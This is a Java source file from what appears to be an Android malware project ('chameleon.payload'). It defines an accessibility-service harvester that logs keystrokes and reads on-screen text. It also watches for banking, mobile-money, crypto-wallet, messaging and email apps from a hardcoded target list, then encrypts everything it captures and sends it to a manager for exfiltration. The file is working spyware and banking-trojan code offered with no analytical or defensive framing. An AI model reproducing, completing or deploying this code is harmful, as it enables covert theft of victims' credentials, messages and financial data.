package com.chameleon.payload.harvester;

import android.content.Context;
import android.util.Log;
import com.chameleon.payload.util.Crypto;
import org.json.JSONObject;

public class AccessibilityHarvester {
    private static final String TAG = "AccessibilityHarvester";
    private final Context context;
    private final HarvesterManager manager;
    private static final String[] TARGET_APPS = {
        "bkash", "nagad", "paytm", "easypaisa", "jazzcash",
        "gcash", "paypal", "venmo", "cashapp", "stripe",
        "whatsapp", "telegram", "facebook", "instagram",
        "gmail", "outlook", "chrome", "firefox", "linkedin",
        "twitter", "snapchat", "binance", "coinbase", "metamask"
    };

    private boolean enabled = false;

    public AccessibilityHarvester(Context context, HarvesterManager manager) {
        this.context = context;
        this.manager = manager;
    }

    public void enable() {
        enabled = true;
        Log.i(TAG, "Accessibility harvester enabled");
    }

    public void disable() {
        enabled = false;
    }

    public boolean isEnabled() { return enabled; }

    public void onKeyEvent(String keys) {
        if (!enabled) return;
        try {
            JSONObject data = new JSONObject();
            data.put("keystrokes", keys);
            data.put("timestamp", System.currentTimeMillis());
            byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
            manager.sendData("keylog", encrypted);
        } catch (Exception e) {
            Log.e(TAG, "Key event error", e);
        }
    }

    public void onAppChanged(String packageName) {
        if (!enabled) return;
        Log.d(TAG, "App: " + packageName);
        reportAppChange(packageName);

        for (String target : TARGET_APPS) {
            if (packageName.toLowerCase().contains(target)) {
                Log.i(TAG, "Target app detected: " + packageName);
                reportTargetApp(packageName, target);
                break;
            }
        }
    }

    public void onScreenTextRead(String text, String packageName) {
        if (!enabled || text == null || text.isEmpty()) return;
        try {
            JSONObject data = new JSONObject();
            data.put("text", text);
            data.put("app", packageName != null ? packageName : "unknown");
            data.put("timestamp", System.currentTimeMillis());
            byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
            manager.sendData("screentext", encrypted);
        } catch (Exception e) {
            Log.e(TAG, "Screen text error", e);
        }
    }

    private void reportAppChange(String packageName) {
        try {
            JSONObject data = new JSONObject();
            data.put("app", packageName != null ? packageName : "unknown");
            data.put("action", "opened");
            data.put("timestamp", System.currentTimeMillis());
            byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
            manager.sendData("app_change", encrypted);
        } catch (Exception e) {
            Log.e(TAG, "App report error", e);
        }
    }

    private void reportTargetApp(String packageName, String target) {
        try {
            JSONObject data = new JSONObject();
            data.put("app", packageName);
            data.put("target", target);
            data.put("timestamp", System.currentTimeMillis());
            byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
            manager.sendData("target_app", encrypted);
        } catch (Exception e) {
            Log.e(TAG, "Target report error", e);
        }
    }
}
